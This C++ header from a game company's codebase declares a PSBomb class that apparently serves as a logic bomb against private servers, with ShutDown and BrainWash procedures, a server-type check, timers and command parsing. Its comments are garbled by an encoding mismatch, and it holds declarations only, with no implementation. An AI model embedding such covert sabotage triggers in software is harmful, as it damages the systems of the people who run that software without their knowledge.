//-----------------------------------------------------------------------------
//!\file ps_bomb.h
//!\author xlguo
//!
//!\date 2009-04-16
//! last 2009-04-23
//!
//!\brief ��˽���߼�ը��
//!
//!	Copyright (c) 2004 TENGWU Entertainment All rights reserved.
//-----------------------------------------------------------------------------

#pragma once
#include "mutex.h"

enum EProc
{
	ETP_None		= 0,
	ETP_Shutdown	= 1,
	ETP_Brainwash	= 2,
};


class PSBomb
{
public:
	enum{
		MAX_PROC_COUNT_TICK	= 10 * 60 * TICK_PER_SECOND,
	};

public:
	PSBomb();

	~PSBomb(){}

public:
	VOID	Init();
	VOID	Update();

	// ������Ϣ
	BOOL OnMsg(const TCHAR* pMsg, const DWORD nLen);
	// ��ʱ����
	VOID	TimerProc(EProc eProc, DWORD dwCount);

	BOOL	Test();

private:
	VOID	Process(EProc eProc);
	VOID	ShutDown();
	VOID	BrainWash();

	BOOL	WriteStatus(EProc eProc, DWORD dwCounter);
	BOOL	LoadStatus(EProc& eProc, DWORD& dwCount);
	BOOL	IsPServer();

	BOOL	ParseCmd( const TCHAR* pMsg, EProc& eProc, DWORD& dwCounter);
	LPTSTR	GetStr(BYTE* pByte, INT nLen);
	VOID	RetStr(LPTSTR pRet);
private:
	EProc	m_eProc;
	DWORD	m_dwCounter;
	Mutex	m_Lock;
	
	BOOL	m_bGuard;
};

extern PSBomb	g_pSGuarder;